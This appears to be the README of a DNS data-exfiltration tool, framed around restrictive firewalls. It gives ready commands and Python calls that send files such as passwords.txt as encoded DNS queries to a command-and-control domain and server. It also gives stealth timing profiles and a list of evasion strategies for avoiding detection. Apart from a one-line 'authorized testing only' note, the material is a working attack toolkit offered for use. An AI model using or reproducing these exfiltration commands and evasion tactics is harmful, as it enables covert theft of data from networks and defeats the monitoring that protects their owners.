# DNS Exfiltration Engine

Exfiltrate data through DNS queries - works through restrictive firewalls.

## Features

- Base64 encoding for DNS compatibility
- Automatic data chunking (DNS label limit: 63 chars)
- Configurable timing and jitter
- Stealth and aggressive modes
- Session tracking with metadata
- Success rate reporting
- DNS connectivity testing

## Installation
```bash
pip install dnspython
```

## Usage

### Exfiltrate Text Data
```bash
python3 dns_exfil.py --domain c2.example.com --data "secret information"
```

### Exfiltrate File
```bash
python3 dns_exfil.py --domain c2.example.com --file passwords.txt
```

### Use Custom DNS Server
```bash
python3 dns_exfil.py --domain c2.example.com \
  --dns-server 10.10.14.5 --file data.txt
```

### Stealth Mode
```bash
# Slower, less detectable (2-5 second delays)
python3 dns_exfil.py --domain c2.example.com --file data.txt --stealth
```

### Aggressive Mode
```bash
# Faster, more detectable (0.1-0.5 second delays)
python3 dns_exfil.py --domain c2.example.com --file data.txt --aggressive
```

### With Metadata
```bash
# Send session info and completion signal
python3 dns_exfil.py --domain c2.example.com --file data.txt --metadata
```

### Test DNS Connectivity
```bash
python3 dns_exfil.py --domain c2.example.com --test
```

## Module Usage
```python
from dns_exfil import DNSExfiltration

# Initialize
exfil = DNSExfiltration(
    domain='c2.example.com',
    dns_server='10.10.14.5',  # Optional
    chunk_size=50
)

# Set timing profile
exfil.set_timing_profile('stealth')

# Test connectivity
if exfil.test_dns_connectivity():
    # Exfiltrate data
    exfil.exfiltrate_data('secret information')
    
    # Or exfiltrate file
    exfil.exfiltrate_file('passwords.txt', send_metadata=True)
```

## How It Works

1. **Data Encoding:** Data is base64 encoded
2. **Chunking:** Encoded data split into 50-byte chunks
3. **DNS Queries:** Each chunk sent as DNS subdomain
4. **Format:** `chunk0001-[data].c2.example.com`
5. **Timing:** Random jitter between queries (anti-detection)

## DNS Server Setup

To receive exfiltrated data, set up authoritative DNS server:
```bash
# Log all DNS queries
tcpdump -i eth0 -n udp port 53
```

Or use dedicated DNS logger to capture and decode queries.

## Architecture

- `core.py` - Main DNSExfiltration interface
- `encoder.py` - Base64 encoding and chunking
- `query_builder.py` - DNS query construction
- `transmitter.py` - DNS query transmission
- `timing.py` - Jitter and timing control
- `cli.py` - Command-line interface

## Timing Profiles

| Profile | Min Delay | Max Delay | Use Case |
|---------|-----------|-----------|----------|
| **Aggressive** | 0.1s | 0.5s | Fast exfil, high detection risk |
| **Normal** | 0.5s | 2.0s | Balanced speed/stealth |
| **Stealth** | 2.0s | 5.0s | Slow exfil, low detection risk |

## Detection Considerations

DNS exfiltration can be detected by:
- Unusual query patterns (high volume to single domain)
- Long subdomain names
- High entropy in subdomain data
- Regular query intervals

**Evasion strategies:**
- Use stealth timing (longer delays)
- Spread over longer time period
- Use legitimate-looking domain
- Mix with normal DNS traffic

## Limitations

- Slow compared to direct HTTP/HTTPS
- Limited by DNS label size (63 chars per label)
- Requires authoritative DNS server setup
- May be logged by network infrastructure
- Some networks block DNS to non-approved servers

## Security Notes

- Always use with authorized testing only
- DNS queries are logged by many systems
- Not encrypted (use pre-encrypted data if sensitive)
- DNS TTL affects caching (use low TTL)

## Example: 100KB File